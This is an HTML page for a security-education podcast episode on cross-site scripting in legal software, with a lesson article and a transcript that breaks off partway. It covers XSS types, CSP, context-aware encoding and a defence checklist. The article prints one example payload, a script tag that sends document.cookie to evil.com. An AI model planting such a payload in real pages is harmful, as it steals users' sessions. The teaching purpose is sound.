@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Episode 9 &mdash; Cross-Site Scripting &mdash; Security for Legal SaaS</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Lora:ital,wght@0,400;0,600;0,700;1,400&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>tailwind.config={theme:{extend:{colors:{ink:'#1a1a1a','ink-light':'#4a4a4a','ink-muted':'#7a7a7a',red:'#991B1B','red-soft':'#B91C1C',rule:'#e5e5e5','rule-dark':'#1a1a1a',paper:'#FAFAF8'},fontFamily:{serif:['Lora','Georgia','serif'],sans:['Inter','sans-serif']}}}}</script>
+    <link rel="stylesheet" href="../assets/css/plyr.css">
+</head>
+<body class="bg-paper font-serif text-ink text-base antialiased">
+    <header class="border-b-2 border-rule-dark">
+        <div class="max-w-3xl mx-auto px-6 py-8">
+            <a href="../index.html" class="block text-center text-3xl font-bold tracking-tight hover:text-red transition-colors">Security for Legal SaaS</a>
+            <nav class="flex justify-center gap-8 mt-4 text-sm font-sans text-ink-muted">
+                <a href="../index.html" class="hover:text-red transition">Episodes</a>
+                <a href="../outline.html" class="hover:text-red transition">Outline</a>
+                <a href="../about.html" class="hover:text-red transition">About</a>
+            </nav>
+        </div>
+    </header>
+
+    <main class="max-w-3xl mx-auto px-6 min-h-[60vh]">
+
+<!-- Episode meta -->
+<div class="py-12 border-b border-rule">
+    <p class="font-sans text-sm tracking-widest uppercase text-red mb-6">Episode 9 &middot; Module 3 &middot; App Security</p>
+    <h1 class="text-4xl md:text-5xl font-bold leading-none mb-8">Cross-Site Scripting</h1>
+    <p class="text-ink-muted font-sans text-base">18 May 2026 &middot; 9:07 &middot; Security for Legal SaaS</p>
+</div>
+
+<!-- Audio player -->
+<div class="py-8 border-b border-rule">
+    <div class="flex items-center gap-6">
+        <button id="play-btn" class="w-14 h-14 border-2 border-ink rounded-full flex items-center justify-center hover:bg-ink hover:text-paper transition flex-shrink-0 group" onclick="document.getElementById('player').paused ? document.getElementById('player').play() : document.getElementById('player').pause()">
+            <svg id="icon-play" class="w-6 h-6 ml-0.5 text-ink group-hover:text-paper" fill="currentColor" viewBox="0 0 20 20"><polygon points="6,4 16,10 6,16"/></svg>
+            <svg id="icon-pause" class="w-6 h-6 text-ink group-hover:text-paper hidden" fill="currentColor" viewBox="0 0 20 20"><rect x="5" y="4" width="3.5" height="12"/><rect x="11.5" y="4" width="3.5" height="12"/></svg>
+        </button>
+        <div class="flex-1">
+            <audio id="player">
+                <source src="../audio/episode-09-cross-site-scripting.mp3" type="audio/mpeg">
+            </audio>
+            <div id="progress-bar" class="h-3 bg-rule relative cursor-pointer" style="margin-top:-6px;padding-top:6px;padding-bottom:6px;">
+                <div class="h-px bg-rule relative">
+                    <div id="progress-fill" class="absolute top-0 left-0 h-px w-0 bg-red"></div>
+                    <div id="progress-dot" class="absolute -top-1.5 left-0 w-3 h-3 rounded-full bg-red"></div>
+                </div>
+            </div>
+            <div class="flex justify-between text-sm font-sans text-ink-muted mt-3">
+                <span id="current-time">0:00</span>
+                <span>9:07</span>
+            </div>
+        </div>
+    </div>
+    <div class="mt-4 flex items-center gap-4">
+        <a href="../audio/episode-09-cross-site-scripting.mp3" download class="inline-flex items-center text-sm font-sans text-red hover:text-red-soft transition">
+            <svg class="w-5 h-5 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/>
+            </svg>
+            Download Episode
+        </a>
+    </div>
+</div>
+
+<!-- Description -->
+<div class="py-12 border-b border-rule">
+    <p class="text-lg leading-relaxed italic text-ink-light">SQL injection attacks your server. XSS attacks your users. Alice and Dan cover stored, reflected, and DOM-based cross-site scripting, context-aware output encoding, Content Security Policy, DOMPurify for rich text, and why legal SaaS &mdash; with its matter notes, document previews, and email rendering &mdash; has an elevated XSS attack surface.</p>
+</div>
+
+<!-- Article -->
+<article class="py-12 border-b border-rule">
+    <h2 class="font-sans text-sm tracking-widest uppercase text-ink-muted mb-10">Today&rsquo;s Lesson</h2>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Security for Legal SaaS — Episode 9: Cross-Site Scripting (XSS)</strong></p>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">The Browser Becomes the Weapon</h2>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Cross-Site Scripting (XSS) is the injection of malicious scripts into web pages viewed by other users. Unlike SQL injection — which targets your server — XSS targets your users' browsers. <a href="https://owasp.org/Top10/A03_2021-Injection/" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">OWASP ranks injection (including XSS) as A03 in the 2021 Top 10</a>, and XSS has been the most commonly reported vulnerability class on bug bounty platforms for over a decade.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">In legal SaaS, XSS is particularly dangerous because the browser has access to everything the authenticated user can see: privileged documents, case strategy, client communications. <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">An attacker who achieves XSS can steal session tokens, read page content, and perform actions as the victim</a> — all invisible to the user.</p>
+
+    <div style="margin:1.5rem 0;" class="border-l-4 border-blue-600 bg-blue-50 px-5 py-4 rounded-r">
+        <p class="text-base leading-relaxed text-ink-light"><strong>Key stat:</strong> <a href="https://www.hackerone.com/resources/reporting/top-10-vulnerabilities">XSS accounted for 18% of all vulnerabilities reported on HackerOne in 2023</a>, making it the single most commonly discovered vulnerability class on the platform.</p>
+    </div>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">Three Types of XSS</h2>
+
+    <h3 style="margin-top:1.5rem;margin-bottom:0.75rem;" class="text-xl font-bold">Stored XSS (Persistent)</h3>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Malicious script is permanently stored on the target server — in a database field, comment, user profile, or document. Every user who views the page containing the stored payload executes the script.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Legal SaaS vector:</strong> A case note field that renders without encoding. An attacker (or compromised account) saves <code><script>fetch('https://evil.com/steal?cookie='+document.cookie)</script></code> as a matter note. Every lawyer who opens that matter has their session token exfiltrated.</p>
+
+    <h3 style="margin-top:1.5rem;margin-bottom:0.75rem;" class="text-xl font-bold">Reflected XSS (Non-Persistent)</h3>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Malicious script is reflected off the server in the immediate response — typically via a URL parameter or form submission that the server echoes back.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Legal SaaS vector:</strong> A search endpoint that reflects the search query in the results page: "You searched for: <code><script>...</script></code>". The attacker crafts a URL and sends it to the target (phishing email to a partner with a link to "review this urgent case").</p>
+
+    <h3 style="margin-top:1.5rem;margin-bottom:0.75rem;" class="text-xl font-bold">DOM-Based XSS</h3>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">The vulnerability exists entirely in client-side JavaScript. The server never sees the payload — it's processed by JavaScript reading from <code>location.hash</code>, <code>document.referrer</code>, or other client-side data sources and injecting it into the DOM unsafely.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Legal SaaS vector:</strong> A document preview component that reads a filename from the URL hash and inserts it into the page using <code>innerHTML</code>. The attacker crafts a URL with a script payload in the hash fragment.</p>
+
+    <div style="margin-bottom:1.5rem;" class="overflow-x-auto">
+        <table class="w-full text-base text-ink-light border border-rule">
+            <thead>
+                <tr class="bg-ink text-paper">
+                    <th class="px-4 py-3 text-left font-sans text-sm font-semibold">Type</th>
+                    <th class="px-4 py-3 text-left font-sans text-sm font-semibold">Storage</th>
+                    <th class="px-4 py-3 text-left font-sans text-sm font-semibold">Server Involvement</th>
+                    <th class="px-4 py-3 text-left font-sans text-sm font-semibold">Detection Difficulty</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr class="border-t border-rule"><td class="px-4 py-3">Stored</td><td class="px-4 py-3">Server database</td><td class="px-4 py-3">Serves the payload</td><td class="px-4 py-3">Hard — payload may be in any stored field</td></tr>
+                <tr class="border-t border-rule bg-paper"><td class="px-4 py-3">Reflected</td><td class="px-4 py-3">URL/form data</td><td class="px-4 py-3">Reflects in response</td><td class="px-4 py-3">Medium — visible in server responses</td></tr>
+                <tr class="border-t border-rule"><td class="px-4 py-3">DOM-based</td><td class="px-4 py-3">Client-side only</td><td class="px-4 py-3">None</td><td class="px-4 py-3">Hardest — server-side scanners miss it</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">Content Security Policy (CSP)</h2>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">Content Security Policy</a> is a browser mechanism that restricts which resources a page can load and execute. It's delivered as an HTTP header:</p>
+
+    <h3 style="margin-top:1.5rem;margin-bottom:0.75rem;" class="text-xl font-bold">CSP Directives for Legal SaaS</h3>
+
+    <div style="margin-bottom:1.5rem;" class="overflow-x-auto">
+        <table class="w-full text-base text-ink-light border border-rule">
+            <thead>
+                <tr class="bg-ink text-paper">
+                    <th class="px-4 py-3 text-left font-sans text-sm font-semibold">Directive</th>
+                    <th class="px-4 py-3 text-left font-sans text-sm font-semibold">Recommended Value</th>
+                    <th class="px-4 py-3 text-left font-sans text-sm font-semibold">Purpose</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr class="border-t border-rule"><td class="px-4 py-3"><code>default-src</code></td><td class="px-4 py-3"><code>'self'</code></td><td class="px-4 py-3">Fallback for all resource types</td></tr>
+                <tr class="border-t border-rule bg-paper"><td class="px-4 py-3"><code>script-src</code></td><td class="px-4 py-3"><code>'self'</code> (no <code>'unsafe-inline'</code>, no <code>'unsafe-eval'</code>)</td><td class="px-4 py-3">Blocks inline scripts and eval — the primary XSS defence</td></tr>
+                <tr class="border-t border-rule"><td class="px-4 py-3"><code>style-src</code></td><td class="px-4 py-3"><code>'self'</code> with nonce or hash</td><td class="px-4 py-3">Restricts stylesheets</td></tr>
+                <tr class="border-t border-rule bg-paper"><td class="px-4 py-3"><code>connect-src</code></td><td class="px-4 py-3"><code>'self'</code> + specific API domains</td><td class="px-4 py-3">Restricts fetch/XMLHttpRequest targets</td></tr>
+                <tr class="border-t border-rule"><td class="px-4 py-3"><code>frame-src</code></td><td class="px-4 py-3"><code>'none'</code> or specific embed origins</td><td class="px-4 py-3">Prevents clickjacking</td></tr>
+                <tr class="border-t border-rule bg-paper"><td class="px-4 py-3"><code>object-src</code></td><td class="px-4 py-3"><code>'none'</code></td><td class="px-4 py-3">Blocks Flash, Java applets</td></tr>
+                <tr class="border-t border-rule"><td class="px-4 py-3"><code>base-uri</code></td><td class="px-4 py-3"><code>'self'</code></td><td class="px-4 py-3">Prevents base-tag hijacking</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">Google's CSP Evaluator</a> analyses your policy for weaknesses. <a href="https://research.google/pubs/pub45542/" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">Research from Google</a> found that 94.72% of deployed CSPs in the wild were bypassable due to misconfigurations — primarily the use of <code>'unsafe-inline'</code> and overly broad allowlists.</p>
+
+    <div style="margin:1.5rem 0;" class="border-l-4 border-red bg-red-50 px-5 py-4 rounded-r">
+        <p class="text-base leading-relaxed text-ink-light"><strong>Critical:</strong> A CSP with <code>script-src 'unsafe-inline'</code> provides almost no XSS protection — the attacker's injected inline script is explicitly allowed. If you cannot eliminate inline scripts (legacy code), use <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#nonces">nonces</a>: each inline script receives a random token that must match the CSP header. Attackers cannot predict the nonce.</p>
+    </div>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">Legal SaaS XSS Attack Surface</h2>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Legal technology has specific features that dramatically expand XSS risk:</p>
+
+    <h3 style="margin-top:1.5rem;margin-bottom:0.75rem;" class="text-xl font-bold">Rich Text Editing</h3>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Matter notes, contract annotations, legal memoranda — all require rich text. <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">Rich text editors like TinyMCE, CKEditor, and Quill must carefully sanitise HTML output</a>. An allowlist of permitted HTML tags and attributes is essential:</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">DOMPurify</a> is the recommended sanitiser — maintained by cure53, a security research firm, and extensively tested against bypass techniques.</p>
+
+    <h3 style="margin-top:1.5rem;margin-bottom:0.75rem;" class="text-xl font-bold">Document Previews</h3>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Displaying uploaded documents (PDF, DOCX, HTML emails) in the browser creates XSS risk if the content renders in the same origin as your application. A malicious PDF with embedded JavaScript, or an HTML email with script tags, executes in your application's context.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Mitigations:</strong></p>
+
+    <ul style="margin-bottom:1.5rem;margin-left:1.5rem;" class="list-disc space-y-2 text-base leading-relaxed text-ink-light">
+        <li>Render document previews in sandboxed iframes with a different origin (<code>preview.legalapp.com</code>, not <code>app.legalapp.com</code>)</li>
+        <li>Use <code>sandbox</code> attribute on iframes: <code><iframe sandbox="allow-same-origin"></code></li>
+        <li>Convert documents to images for preview (eliminates active content entirely)</li>
+        <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">Set <code>X-Content-Type-Options: nosniff</code></a> to prevent MIME-type sniffing</li>
+    </ul>
+
+    <h3 style="margin-top:1.5rem;margin-bottom:0.75rem;" class="text-xl font-bold">Email Rendering</h3>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Legal SaaS that displays email content (matter-linked email threads, client communications) faces severe XSS risk. <a href="https://portswigger.net/research/breaking-out-of-a-sandboxed-iframe" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">Email HTML is notoriously dangerous</a> — crafted by potentially adversarial senders.</p>
+
+    <ul style="margin-bottom:1.5rem;margin-left:1.5rem;" class="list-disc space-y-2 text-base leading-relaxed text-ink-light">
+        <li>Strip all JavaScript before rendering</li>
+        <li>Render in a sandboxed, cross-origin iframe</li>
+        <li>Rewrite <code>href</code> attributes to proxy through your domain (prevents tracking and reduces phishing from rendered links)</li>
+        <li>Block <code>form</code> elements entirely</li>
+    </ul>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">Output Encoding by Context</h2>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">The fundamental XSS defence is context-aware output encoding</a>. The same data requires different encoding depending on where it appears in the HTML document:</p>
+
+    <div style="margin-bottom:1.5rem;" class="overflow-x-auto">
+        <table class="w-full text-base text-ink-light border border-rule">
+            <thead>
+                <tr class="bg-ink text-paper">
+                    <th class="px-4 py-3 text-left font-sans text-sm font-semibold">Output Context</th>
+                    <th class="px-4 py-3 text-left font-sans text-sm font-semibold">Encoding Required</th>
+                    <th class="px-4 py-3 text-left font-sans text-sm font-semibold">Example</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr class="border-t border-rule"><td class="px-4 py-3">HTML body</td><td class="px-4 py-3">HTML entity encoding</td><td class="px-4 py-3"><code><</code> → <code>&lt;</code></td></tr>
+                <tr class="border-t border-rule bg-paper"><td class="px-4 py-3">HTML attribute</td><td class="px-4 py-3">Attribute encoding (quote all values)</td><td class="px-4 py-3"><code>"</code> → <code>&quot;</code></td></tr>
+                <tr class="border-t border-rule"><td class="px-4 py-3">JavaScript string</td><td class="px-4 py-3">JavaScript escape</td><td class="px-4 py-3"><code>'</code> → <code>\'</code>, or JSON.stringify</td></tr>
+                <tr class="border-t border-rule bg-paper"><td class="px-4 py-3">URL parameter</td><td class="px-4 py-3">URL/percent encoding</td><td class="px-4 py-3"><code><</code> → <code>%3C</code></td></tr>
+                <tr class="border-t border-rule"><td class="px-4 py-3">CSS value</td><td class="px-4 py-3">CSS escape</td><td class="px-4 py-3"><code>(</code> → <code>\28</code></td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">OWASP's XSS Prevention Cheat Sheet</a> defines these rules in detail. The critical insight: <strong class="text-ink">HTML entity encoding alone is insufficient</strong> if user data appears in a JavaScript context, URL context, or CSS context. Each requires its own encoding function.</p>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">Auto-Escaping and Its Gaps</h2>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Modern template engines (React, Vue, Angular, Jinja2, Handlebars) auto-escape by default. React's JSX treats all expressions as text unless you explicitly use <code>dangerouslySetInnerHTML</code>. <a href="https://reactjs.org/docs/introducing-jsx.html#jsx-prevents-injection-attacks" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">This eliminates the majority of XSS vulnerabilities</a>.</p>
+
+    <h3 style="margin-top:1.5rem;margin-bottom:0.75rem;" class="text-xl font-bold">Where Auto-Escaping Fails</h3>
+
+    <div style="margin-bottom:1.5rem;" class="overflow-x-auto">
+        <table class="w-full text-base text-ink-light border border-rule">
+            <thead>
+                <tr class="bg-ink text-paper">
+                    <th class="px-4 py-3 text-left font-sans text-sm font-semibold">Gap</th>
+                    <th class="px-4 py-3 text-left font-sans text-sm font-semibold">Framework Feature</th>
+                    <th class="px-4 py-3 text-left font-sans text-sm font-semibold">Risk</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr class="border-t border-rule"><td class="px-4 py-3">Raw HTML insertion</td><td class="px-4 py-3">React: <code>dangerouslySetInnerHTML</code>; Vue: <code>v-html</code></td><td class="px-4 py-3">Renders unsanitised HTML directly</td></tr>
+                <tr class="border-t border-rule bg-paper"><td class="px-4 py-3"><code>href</code> and <code>src</code> attributes</td><td class="px-4 py-3"><code><a href={userInput}></code></td><td class="px-4 py-3"><code>javascript:alert(1)</code> executes on click</td></tr>
+                <tr class="border-t border-rule"><td class="px-4 py-3">Event handlers</td><td class="px-4 py-3"><code><div onClick={...}></code> with user data</td><td class="px-4 py-3">Arbitrary code execution</td></tr>
+                <tr class="border-t border-rule bg-paper"><td class="px-4 py-3">Server-side rendering (SSR)</td><td class="px-4 py-3">Hydration mismatches</td><td class="px-4 py-3">Client renders differently than server</td></tr>
+                <tr class="border-t border-rule"><td class="px-4 py-3">Template literals</td><td class="px-4 py-3">`<code> </code><div>${userInput}</div><code> </code>`</td><td class="px-4 py-3">No escaping in template strings</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">For <code>href</code> attributes, always validate the URL scheme</a>:</p>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">XSS Impact in Legal SaaS</h2>
+
+    <div style="margin-bottom:1.5rem;" class="overflow-x-auto">
+        <table class="w-full text-base text-ink-light border border-rule">
+            <thead>
+                <tr class="bg-ink text-paper">
+                    <th class="px-4 py-3 text-left font-sans text-sm font-semibold">Attack</th>
+                    <th class="px-4 py-3 text-left font-sans text-sm font-semibold">Mechanism</th>
+                    <th class="px-4 py-3 text-left font-sans text-sm font-semibold">Consequence</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr class="border-t border-rule"><td class="px-4 py-3">Session hijacking</td><td class="px-4 py-3">Steal session cookie via <code>document.cookie</code></td><td class="px-4 py-3">Full account takeover</td></tr>
+                <tr class="border-t border-rule bg-paper"><td class="px-4 py-3">Keylogging</td><td class="px-4 py-3">Inject keylogger script on login page</td><td class="px-4 py-3">Credential theft</td></tr>
+                <tr class="border-t border-rule"><td class="px-4 py-3">Document exfiltration</td><td class="px-4 py-3">Read DOM content of privileged documents</td><td class="px-4 py-3">Privilege breach</td></tr>
+                <tr class="border-t border-rule bg-paper"><td class="px-4 py-3">Phishing overlay</td><td class="px-4 py-3">Inject fake login modal</td><td class="px-4 py-3">Credential harvesting</td></tr>
+                <tr class="border-t border-rule"><td class="px-4 py-3">Privilege escalation</td><td class="px-4 py-3">Perform admin actions as the victim</td><td class="px-4 py-3">Tenant-wide compromise</td></tr>
+                <tr class="border-t border-rule bg-paper"><td class="px-4 py-3">Worm propagation</td><td class="px-4 py-3">XSS that copies itself into other stored fields</td><td class="px-4 py-3">Viral spread across all users</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><a href="https://en.wikipedia.org/wiki/Samy_(computer_worm" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">The Samy worm (2005)</a>) demonstrated that stored XSS can propagate virally — infected profiles automatically infecting viewers' profiles. In a legal SaaS context, a stored XSS worm in matter notes could spread across every matter a lawyer views, exfiltrating privileged content at scale.</p>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">Defence Checklist</h2>
+
+    <ol style="margin-bottom:1.5rem;margin-left:1.5rem;" class="list-decimal space-y-3 text-base leading-relaxed text-ink-light">
+        <li><strong class="text-ink">Output encode by context</strong> — HTML, attribute, JavaScript, URL, CSS each need different encoding</li>
+        <li><strong class="text-ink">Use auto-escaping frameworks</strong> — React, Vue, Angular do this by default</li>
+        <li><strong class="text-ink">Sanitise rich text with DOMPurify</strong> — allowlist permitted tags and attributes</li>
+        <li><strong class="text-ink">Deploy strict CSP</strong> — no <code>'unsafe-inline'</code>, no <code>'unsafe-eval'</code>, use nonces</li>
+        <li><strong class="text-ink">Sandbox document previews</strong> — cross-origin iframes for untrusted content</li>
+        <li><strong class="text-ink">Validate URL schemes</strong> — block <code>javascript:</code>, <code>data:</code>, <code>vbscript:</code></li>
+        <li><strong class="text-ink">Set security headers</strong> — <code>X-Content-Type-Options: nosniff</code>, <code>X-Frame-Options</code></li>
+        <li><strong class="text-ink">HttpOnly cookies</strong> — prevents JavaScript access to session tokens</li>
+        <li><strong class="text-ink">Audit <code>dangerouslySetInnerHTML</code> / <code>v-html</code></strong> — every instance needs DOMPurify</li>
+        <li><strong class="text-ink">CSP reporting</strong> — deploy in report-only first, then enforce. <a href="https://report-uri.com/" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">Report-URI</a> provides monitoring</li>
+    </ol>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">Conclusion</h2>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">XSS turns your users' browsers into attack platforms operating within your application's trust domain. Legal SaaS is particularly vulnerable because the product necessarily handles rich text, document previews, and email content — all XSS amplifiers. <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">Context-aware encoding, strict CSP, and HTML sanitisation form the defence triad</a>. Auto-escaping frameworks handle 90% of cases; the remaining 10% — raw HTML, dynamic URLs, document rendering — demands deliberate attention.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Next episode: <strong class="text-ink">File Upload Security</strong> — where we examine what happens when users upload files that aren't what they claim to be.</p>
+</article>
+
+<!-- Transcript -->
+<section class="py-10 border-b border-rule">
+    <button
+        class="font-sans text-base text-red hover:text-red-soft transition flex items-center gap-2 group"
+        onclick="document.getElementById('transcript-body').classList.toggle('hidden'); this.querySelector('svg').classList.toggle('rotate-90');"
+    >
+        <svg class="w-5 h-5 transition-transform" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M9 5l7 7-7 7"/></svg>
+        <span class="border-b border-red/40 group-hover:border-red">Show Transcript</span>
+    </button>
+    <article id="transcript-body" class="hidden mt-8 space-y-4">
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> Welcome back to Security for Legal SaaS. I&rsquo;m Alice.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-ink">Dan:</span> And I&rsquo;m Dan. Episode 9 &mdash; Cross-Site Scripting, or XSS. Alice, last episode we talked about injecting into databases. This time the injection target is the user&rsquo;s browser?</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> Exactly. SQL injection attacks your server. XSS attacks your users. The attacker injects malicious JavaScript into pages that other users view, and that script executes with full access to whatever the victim can see. In legal SaaS, that means session tokens, privileged documents, client communications &mdash; anything displayed in the browser.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-ink">Dan:</span> How does malicious script get into a page in the first place?</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> Three variants. Stored XSS &mdash; the attacker&rsquo;s script is saved in your database. Maybe it&rsquo;s in a case note, a user profile, a comment field. Every user who views that record executes the script. Reflected XSS &mdash; the script is in a URL parameter that the server echoes back in the response. The attacker sends a crafted link to the victim. And DOM-based XSS &mdash; DOM stands for Document Object Model, the browser&rsquo;s internal representation of the page &mdash; the server is never involved. Client-side JavaScript reads from an unsafe source like the URL hash and injects it into the page directly.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-ink">Dan:</span> In legal SaaS, stored XSS seems particularly dangerous. You have shared matter notes, collaborative documents...</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> Catastrophically so. Imagine a case note field that doesn&rsquo;t encode output. An attacker &mdash; or a compromised account &mdash; saves a script tag as a note. That script sends the session cookie to an external server. Every lawyer, paralegal, and partner who opens that matter gets their session stolen. The attacker now has authenticated access to every matter each of those users can access.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-ink">Dan:</span> And because it&rsquo;s stored, it keeps executing every time someone views it. It&rsquo;s not a one-shot attack.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> It persists until someone notices and removes it. The Samy worm in 2005 demonstrated this can go viral &mdash; an XSS payload that copies itself into every profile that views it. In a legal SaaS context, a worm in matter notes could propagate across every case a lawyer touches.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-ink">Dan:</span> Terrifying. OK, what&rsquo;s the primary defence?</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> Context-aware output encoding. The principle is simple &mdash; when you render user-supplied data into an HTML page, encode it so the browser treats it as data, not code. But the critical nuance is that different contexts require different encoding. User data in an HTML body needs HTML entity encoding &mdash; angle brackets become ampersand-lt and ampersand-gt. User data in a JavaScript string needs JavaScript escaping. User data in a URL parameter needs percent-encoding. Get the context wrong and the encoding doesn&rsquo;t protect you.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-ink">Dan:</span> Modern frameworks like React handle this automatically, right?</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> They do, and that&rsquo;s eliminated the majority of XSS in greenfield apps. React&rsquo;s JSX treats all interpolated expressions as text by default. You can&rsquo;t accidentally render HTML. But &mdash; and this is a big but &mdash; every framework has escape hatches. React has dangerouslySetInnerHTML. Vue has v-html. Angular has bypassSecurityTrustHtml. These exist because legitimate use cases require rendering HTML &mdash; rich text editors, formatted content, document previews. Every use of those escape hatches is a potential XSS vector.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-ink">Dan:</span> Legal SaaS has a lot of rich text. Matter notes, contract annotations, legal memos with formatting.</p>
+
